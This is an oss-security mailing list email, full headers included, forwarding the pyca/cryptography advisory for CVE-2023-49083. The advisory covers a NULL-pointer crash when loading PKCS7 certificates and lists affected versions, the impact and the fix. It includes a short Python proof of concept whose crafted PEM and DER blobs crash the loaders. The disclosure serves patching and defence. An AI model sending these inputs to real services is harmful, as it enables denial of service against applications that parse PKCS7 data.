Received: (qmail 9275 invoked by uid 550); 29 Nov 2023 19:31:00 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9254 invoked from network); 29 Nov 2023 19:30:59 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com; h=message-id : date :
 subject : to : from : content-type : content-transfer-encoding :
 mime-version; s=corp-2023-11-20;
 bh=OfL74E1hMC4JEpwNbA7An6F5uwH7lay4gPX7uJxGg28=;
 b=MxMu6GXdPdnBrTQDW6WRn4p/5PAgt6VSvuP2xMgnFLbUBXmFn5p7JCIgSEf4Gihc6RGS
 vXOPncN0Z7f8aLHq8gQXbiPa9WtWF4AspNIhvhV6a0sl1tPVG7pVbsFEFK/dP//NSPx6
 0xhAO+UjB+UQJmpj9hLUQZSlxqqyV5orRiB2DlxhFTlsY3u7/XbXjPDPIC3ybqv/H+Zt
 w5igumJCKTvwOGiavkfyuit/R03cECbZE8tcyfD3itmNJCSSpZc9wKH/d13iqABeD8sh
 0znTmuaE5MGG2+ZKn1pmdjT6HIRpD3CmKBlKrGkeigSFQcBEmIbfufLecFiDq9HB66FS OA== 
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=Hih4UDYqd7vp+CTIC7NHb+Uv0b4PF8Kabfi7yKByTTQE18NMgxuniZyX+W4kdD/KXCVu6x9epqIB/E2y/TRED34xIgKq5M1LEZHzWrKUb/suN50V0Yg4jdCnGLrQWJaN1uIcXjqaXfOw6arykQIVgJT4lhAZ8/S5I3/RDHmBacnYFyJN7yWhIXwVjDhw0iGf3Yj6MKNPb0V2V5LHE3jYtkJerEf2Jsu9AlNj1UYvZL113ZuO/ttAho4TJ5Nwv+/ssN08qj+X9UXJIxe+Z0r4i2aPqSvoiG861sCpVaNYtnZLdarYjRokHuEp4k4UX1EubT5spTpe2MIsgkCiJddGfw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=OfL74E1hMC4JEpwNbA7An6F5uwH7lay4gPX7uJxGg28=;
 b=bLLLB5RYfUr1pM8/NUTUMwxTbBD5J34JUEpJkDvRmmdjKwb/mU4zJ88Epqu3l7k+JMj/N3l3VXWLChgReQYpbb8fNyDHhCwCcWxYexnW/dPFajvAvLQxR0rIQu0HmGNRGF37zA0TwQdL+RjO+spFOdUQ29LVoM3e947LU95Vr+7VikBlPKq8In9emGlrOlW1v3VhMUOpPGENvwJpO5xCGbHBOZH2PMhAF8qs4tRVkn1hPqnGdWlrKQoHFqVj5q3KRsrlMOPpzaOv8fxnOdK6Zh8akpoUs1aBcbH7Ama71vKGtbRqUM57j5vLmTXEdQrTe4QaoXiRuMkfUjzVnQhThA==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=oracle.com; dmarc=pass action=none header.from=oracle.com;
 dkim=pass header.d=oracle.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=oracle.onmicrosoft.com; s=selector2-oracle-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=OfL74E1hMC4JEpwNbA7An6F5uwH7lay4gPX7uJxGg28=;
 b=EB31RLYx11wDHDRPkjGS4M/VgqGKgdAhcYfyPy/YE9T56eGCDbiznslxpd6x1SJ8P+yfESRJ77kn0m4/nwD1+OVw0hynRis8+gSZqi4ZEqdD0SFdpN2i/1lJs9zGAl+b9DY93FqFkBIc9R958ey4ruL51qsxMfFWu1WpzPbYMEk=
Message-ID: <ea180550-801c-4a6d-b8aa-dee79d76f17a@oracle.com>
Date: Wed, 29 Nov 2023 11:30:39 -0800
User-Agent: Mozilla Thunderbird
Content-Language: en-US
To: oss-security@lists.openwall.com
From: Alan Coopersmith <alan.coopersmith@oracle.com>
Autocrypt: addr=alan.coopersmith@oracle.com; keydata=
 xsDiBEab+moRBACDH5yKqS3wcc5bdxY7PBNuwKvF5TKMfagmSvuRDtZjjIIWaA/nZ1KboV9G
 q5g7kP7+Kfu+Qgd8u65eVsWwmPW10fXvj3aCU53glx2EdGdrHcgiyH2gEQfPiyBw+trIppWF
 RV0IDXSLMA1FNC92t2nSG/VFHaPTVwcgkIRSfcXDvwCglGdEa6f4uLqoNHP+m4yYnzapFuMD
 /R4+2AJDAvEWKDdYCGZzlawjAmmWyXrmT7/C/mx98qUR473l4buXjHgDkkXXlHqdzil1vK85
 PhrKzNJDCCmlHUJNz+QwiAMOLwpD+kwVPb57RG7y+a5JQ5+jtVw4RlUxZIk/wj2An9YBO3A5
 vR7PdjM32ZJCN2+aM4dYfNzQxQKTA/47icvBaBVTl9rztjg2pd2Aqpc1P/GsIYLGj7XjnnJv
 GAENBHSH1QjpZMJGCTS9oJ+B0/wrIr+pA+MdFgYAb6ojMQJOO6UChjWWSGjMFcs/CeXhxlLB
 ido3DtAETbNTwO6OEfAvdosvTdhJFnwvZlJ+zZGGy5CrF2Fd9PUe9tmASc0uQWxhbiBDb29w
 ZXJzbWl0aCA8YWxhbi5jb29wZXJzbWl0aEBvcmFjbGUuY29tPsKCBBMRCgBCAhsDBgsJCAcD
 AgYVCAIJCgsEFgIDAQIeAQIXgAIZARYhBEoZPAbTXnxnD6TvC6L7nggfLRMOBQJkQs2eBQkn
 DNS0AAoJEKL7nggfLRMO1esAnR4FVD60BpDY/bJp5RC1VXhOVlo4AKCJgsQeVeGLxDlMuhAm
 bcCkOjafqc7BTQRGm/pvEAgAmnlpSWGjmtSGlLqKTuymwBAU9G7Jw8ow27QngXS/86g/PTzm
 yhXzK0uPgeoIaTZlqaHWNKCWJnC6T2btXtaDHH6cElrClYNf94os5sSt8PBDh184W+NtctAy
 Y2dA1pQYhYs8/eXwa4E4cyrrQG75M+CHrbu9Se0vlERARCpNcjNYLpTXRCwNuUvAi905VJ0Y
 XnGX83WbJfNIq+uxnBa2gVzwb2/2FwKOG03Wyb1vs6NznWJle9x61y8/LlEDoBRbfIQTFp51
 R0ue8gX2yMVgh8lYVViHYCBq+cat7p8X41Xa/fN/HfBFPsf3/+bhggNgmaBmDJBxxd6BPB8Y
 EireiwADBgf/UWIxQwwRLkiXPacOoh34MJYQIBTrCC8gVFxetlbEPEH5mueZMJegAPTF52l8
 6REenxdNVz/0xT7BD6VlHHY5DowlbRca4W8eb3gpkX/wfNYDYCHtTifT7ewumTrNZx5mrbNk
 0XTJVOPAP3z7E0rVD2w/xo4p22DzIwfeGKwpHqt1b6Z9fmrRDwaiXaFmwUf+rIiGc/OFcOSe
 46HwTmIyTOt6NVdQSf75jOPbdeM/n1I5svOdWTLEj6QEj2q9UQ98UEPJuMdaotyBFwKlcDOO
 LMSL793fWINrYSskdXhHjaht5wWqI+egO2JfciI/vP1+bEzhpY9llGq+r7WG3nCSf8JJBBgR
 AgAJBQJGm/pvAhsMAAoJEKL7nggfLRMOgugAoIdhGnD9d/IS6fDVgv+4xnOXvyohAJ0VVxc1
 uoPzepWFbgvLuHIMvyjRog==
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit
X-ClientProxiedBy: SJ0PR03CA0122.namprd03.prod.outlook.com
 (2603:10b6:a03:33c::7) To DS7PR10MB5005.namprd10.prod.outlook.com
 (2603:10b6:5:3ac::15)
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: DS7PR10MB5005:EE_|IA1PR10MB6265:EE_
X-MS-Office365-Filtering-Correlation-Id: 5307a34e-2aa1-4ee3-0475-08dbf111ad19
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: 
	xU1RF69d3oN+8SClHUqAYnnLzP9EHfT3Me4UJNVXZs88LdZUdyxUAknSIyab1bCsw008PlIbZaXKcPoG5zMdGhmpVqRQo/wLW/4pq8lV2nLX/SuWftzantj/N+ILXw1eA/uhKCDagWDZw9ti+qqU+iTF8+53239tqhhoDsYgP1odOTu16pxAQ5RVjPvrVXahfo6O4+UuQPq1OyYi+df8O/I2u4u/bdm823eFP4dB98YScCALxxVEu5qDhFPzgHT0v9WxnAYs5ZjQW4i6rVtdmyxGTdC0AdLto4RoUCt4WwFpAefnAZvhMgMotRDEZNdPAmztn9XN9bL8Pp8gJEPRIrmyE0WlEw4SwwXuB02hGQwwrkzsIODL0WZ+K+25PEsRNFkBkEOov4EfYFHyx1xQxkaJJRFhIP7WOmuoMaF3VV0JrdhH41FmxmMNo7uXp3cxUhijChrYkurIn+LErbJ84vBpvkRjq7LweHI649JGwpjeKtaBrNhzIikiC1SiP/MV3P3xWxah9+YxI0J8sqawuRYpYCPuzQLuEPBSXL92EaZeOwFHVeqbUJIp0auxTOvTWLgWj8kdsGCC0GZHb8e8bTsDb70FStKhtnqFdMCHuL7YSvzlg/oANEq5NaysrHCnnUPh+VsziTJco+mYw2v5qeheHfdtbHA2VZRBc7I7cpJXP6x0hhfUD9xodMjF6Eqw1XjSjDtqjTeVmnbi0dgVuw==
X-Forefront-Antispam-Report: 
	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:DS7PR10MB5005.namprd10.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230031)(376002)(396003)(136003)(39860400002)(366004)(346002)(230922051799003)(451199024)(186009)(64100799003)(1800799012)(66556008)(66946007)(316002)(966005)(6486002)(66476007)(6916009)(6506007)(478600001)(6512007)(83380400001)(36756003)(202311291699002)(86362001)(38100700002)(2616005)(44832011)(19627235002)(8676002)(8936002)(5660300002)(41300700001)(31696002)(6666004)(31686004)(26005)(2906002)(43740500002)(45980500001);DIR:OUT;SFP:1101;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0: 
	=?utf-8?B?TnpTbURoUmVJOGhXNlU0ZG90MFFCcG4xcWhFNmh4aGpERmx1T2h6YTdpbnZH?=
 =?utf-8?B?OG9ldUxRM1F3L0hqeEE4RE95SlJadDU2Q2dTdjVPWmc1WnhIMzZiQU9KL1N1?=
 =?utf-8?B?T29iaHRwSlUyTEh6eS93cHhEYXRJNzN2bVFOR1Y2ZmpRRkVNd2ZqTGVDQUVM?=
 =?utf-8?B?d25PNmRubC9kZzZEM25OK2NLQWo2cXAzdVRUbGtxVmdhcEJGa2JsUDVoRi9j?=
 =?utf-8?B?TG5ENSsvVW5ldk04NE5YT0szaVpZdnRHRGMxV09YOWlMcTVkOHRMcllYKzJq?=
 =?utf-8?B?MDlBK1Z6bnNuU2Z1R3FUbGNmM29tSUVobXVQcHVRKzhySnI0NEZkdkZYcnp0?=
 =?utf-8?B?WEtQZkE2MVYwd0Y0bE1FZ1RtamM1QzZQcXVhd2R5dlliRE5vVWE0Y0xRNVdm?=
 =?utf-8?B?aE95OE16S2VCa2d1dVpIOXVuZkR3OENIcmk3ZFVjRDd5TWU5TmdScFZiUWNS?=
 =?utf-8?B?cURUNU5CQnRpZGh1ZXZPbkFCWWtUUTkwRHdtV3FoVC93YnR2WGhsTWo4cm1p?=
 =?utf-8?B?eGNvaUpWTjFKb1M5Q2lHelR2Y283KzFSSy9OZXhBV2wxY1dPS09mSUVKYjcv?=
 =?utf-8?B?bE9ueHg0c3hVRkVNN0tEVEJHN2xNR2Z3eUR0aUQ4bDhYampQOXltVTRWV2Zu?=
 =?utf-8?B?d2lISHcra2orRithejQ2a2l5bFJzcWlXTisvM09UVThzQVNBa0lKVy96SnE4?=
 =?utf-8?B?YnhubjA2OFZ4dkoxZ0o2Vzk2c1ZlWDlvQVFPbGVuQ1BlM2ppYStuZStWZFo5?=
 =?utf-8?B?aDdXTWxUR2RYaHZsS0t0Sk4rK1orTHhBRFVJOWMrZGtmQm8zNmhLblZZVWpF?=
 =?utf-8?B?anZSWnM5ZE9mS0N0Nk11Y0tNVDlRMkFJcDJ0UTFwUkJjMHhzeFIxT3Y0SGxq?=
 =?utf-8?B?c2dlU1VDTGoyZ0ZvdWlpaDVKSHl0N1M4ZW51M3ZPMVdOVlFPQXZoNENWVnJj?=
 =?utf-8?B?T2tXdGZ0OXgzVFF3b1lJZXpJZysrUUF3RUg1S1hpLzZkT0liZ0xacVpuVTMx?=
 =?utf-8?B?RjlOMWRCbE5IeEZQdzRZZmpVOE1xQ0VvVFY4UTdhdldjSjExSDZjK1FDMi8z?=
 =?utf-8?B?SkNuRjE0WFdGNVRxNm5yMUVFcXc2bm53bXpGVEhJZEJFa2RHSXQwRFdqTEky?=
 =?utf-8?B?VVpXZGowaFVQUTdydHJiTkY0V3FUWTlJSndHaWhBRTBZQUw3UG11VU9Cdmtq?=
 =?utf-8?B?MnN0dGJzN3dXRE5jT096amsrQWl2cmtLRGo1L0RBRU1XLzRVd2NBb1FFRnRi?=
 =?utf-8?B?amk0djhOSEZFeGxyamEwZm5ra29QR1NidzZ2eDhkVUYzUXZoaUhaQmd1VFdU?=
 =?utf-8?B?TkN2cWw5ci9YbWdmL2cwUUZBVmNNMTRHaXBaOFRvaWJlSytzNnZSUXg1UFZV?=
 =?utf-8?B?SWxtVC9QV0lUSTJVMmJHUWwrN1RPQjJvSUJTR1Z5UkdhMmQ5YWpIdDJPM2FR?=
 =?utf-8?B?WEU3TlJiemg5NlAvUmNMeDJJSVpBSlVPdFZteWthWUYrYlVYTjFvU3pJMFVQ?=
 =?utf-8?B?VUhkNkJ4WFhZUmwxZE1GMWRZVm5nSitrV0RZTk9ZcS9wRHZvNEVUR0R3Q0Q5?=
 =?utf-8?B?RS91UmpLOXNlR1k2cVRwL0UyY1psSVV1N0JiTktyTWtmUloveTN6aDJjZGc2?=
 =?utf-8?B?RWZmWkNHVllBUitxRXlITDU5ZDFpVG8rMWNsT3hOT2I2RWcyL1hXcU94Uml3?=
 =?utf-8?B?NTUzQTBWbEtYcW5hWGxaOFJjazkzbWdRNklyK0dzVTYxd1JKbTlSWnpzcCt6?=
 =?utf-8?B?Qy9LbGNXWVAwRERnVXZpVWhrRUh5aXpUZmRJYWNqelZBZ2dYdjRqWVUza0pt?=
 =?utf-8?B?UVJtWmFSU1hCSHh2OWFjUkFYWXl1cUltTFhsbkwveHJyQ1l1bUliaUJYbVZk?=
 =?utf-8?B?UHJZeXhseS9KbTZJcXlVQ1NBc1pmUkJibHZWQXdyZUg0dm9vNkd2TXMxeHZy?=
 =?utf-8?B?L05QTS81NXFGV0RNMzhNd2hMQ25lNjhncnNMVGZVMUNKTC83czE3RjhQMFd4?=
 =?utf-8?B?UWpSMVFocEFtQitFU0RSdVFsMW83RHVXaFluRCtxTjFQbUtPd0Q2UU9aN2Ni?=
 =?utf-8?B?K0xoQkYvdWU5Ukt3SWUwS2VHRnNHMTNHUU9PZzRlOVFxSi9MTVdJS0VsWWhh?=
 =?utf-8?B?TVgxYTJWWkZQZGtncm5WaHBWa2F4bWIyL2dObkNIMVE3YWx3RnlXcXB4R0Nx?=
 =?utf-8?B?K2c9PQ==?=
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-0: 
	FLB4Vsc/wz/JwhK3owiGx5q0HYWGAxDwHX13br02u6I8eZXdkqJVPx7Ba723qZGGoDjKwx+x68JWtYv7x4EfRoNFro9sygMfvRBMGw9pNlipawyrr+/qfGgueV1N0UmLDQyGRz6PZ34c7GmLIv7AkDnp6vl11aVaJ3kNG/BpB2dupb5AMWX54JMuk6ZBFwNBhlNp5PSdjXcKqzZCkB9rQBe0ENizq07wCsZBgujrpTRnIR1LcPtwGFYzlpT56QDjNiJXlTHmdvgxO6hP4w6sH9Ziez9Wljf9wwH57QpdYCPpCFS4vGdE5IvNtaMFOX5LAINjho5onOvM4XqMTvKpcmxgSGjWXiHsirvn6+/QXrbya91FU1U7FKVtc1ZuTLAEAspdSTTVfloI/ScVnYF2VUmmarTZLQKl7W6VV1VXfNjOWY+45zp93UY4LPj8FZoDyVZ6lLQ2fCvlfz0v/A6uikkIcyRDnXYJDuaxGUijB0m/d7LnF+hg5YuAp6YajUHjUrKwVDnyQc6dcQ/O+k81PjCCBq/yXp1zjTBnVQIYaa0zaG7rgJ/j8tgVEfyTNWawTMB7pJ6EGvJJT7DwX2S0pgy9RBuNafBlbP6wwBPlXJ4HGuplM7F9pkL7u14g/B8gLok9c2Jh1TfZCTO2Z8Y9OzuwUG8yaL+URp4mfJB3O/QnH06cW+QgoGhj67sTfNY/MTcdRO5bMWRUlpqcOgbiwFWK5aCoqGsTDdzQrpmMyzUsG8hnkT6NUJMjEGWNftzEI8woO8Ho4HXAX23YgIo+zQ==
X-OriginatorOrg: oracle.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 5307a34e-2aa1-4ee3-0475-08dbf111ad19
X-MS-Exchange-CrossTenant-AuthSource: DS7PR10MB5005.namprd10.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 29 Nov 2023 19:30:42.5147
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 4e2c6054-71cb-48f1-bd6c-3a9705aca71b
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: 7ANIpfJ4XmYjwVkMt1zDA9doCW7S8F/xtB4JPdPO7b7Rv3HQuxrNPv4uUZdAaH7k7osSB6x/PB0qqpGLLrbIcnYpSoBH1LdiSI6ffbTIADM=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: IA1PR10MB6265
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.272,Aquarius:18.0.997,Hydra:6.0.619,FMLib:17.11.176.26
 definitions=2023-11-29_18,2023-11-29_01,2023-05-22_02
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 bulkscore=0 phishscore=0 mlxscore=0
 malwarescore=0 adultscore=0 suspectscore=0 spamscore=0 mlxlogscore=999
 classifier=spam adjust=0 reason=mlx scancount=1 engine=8.12.0-2311060000
 definitions=main-2311290149
X-Proofpoint-GUID: eWrmxdyS1joAzpuWWlv9Ebpbm6ePG2w-
X-Proofpoint-ORIG-GUID: eWrmxdyS1joAzpuWWlv9Ebpbm6ePG2w-
Subject: [oss-security] Python Cryptography advisory: CVE-2023-49083 NULL-dereference when
 loading PKCS7 certificates

https://github.com/pyca/cryptography/security/advisories/GHSA-jfhm-5ghh-2f97
reports:

-------------------------------------------------------------------------------
Affected versions >= 3.1, < 41.0.6
Patched versions >=41.0.6

Summary

Calling load_pem_pkcs7_certificates or load_der_pkcs7_certificates could lead to 
a NULL-pointer dereference and segfault.
PoC

Here is a Python code that triggers the issue:

from cryptography.hazmat.primitives.serialization.pkcs7 import 
load_der_pkcs7_certificates, load_pem_pkcs7_certificates

pem_p7 = b"""
-----BEGIN PKCS7-----
MAsGCSqGSIb3DQEHAg==
-----END PKCS7-----
"""

der_p7 = b"\x30\x0B\x06\x09\x2A\x86\x48\x86\xF7\x0D\x01\x07\x02"

load_pem_pkcs7_certificates(pem_p7)
load_der_pkcs7_certificates(der_p7)

Impact

Exploitation of this vulnerability poses a serious risk of Denial of Service 
(DoS) for any application attempting to deserialize a PKCS7 blob/certificate. 
The consequences extend to potential disruptions in system availability and 
stability.

-------------------------------------------------------------------------------

The fix was in https://github.com/pyca/cryptography/pull/9926

-- 
         -Alan Coopersmith-                 alan.coopersmith@oracle.com
          Oracle Solaris Engineering - https://blogs.oracle.com/solaris
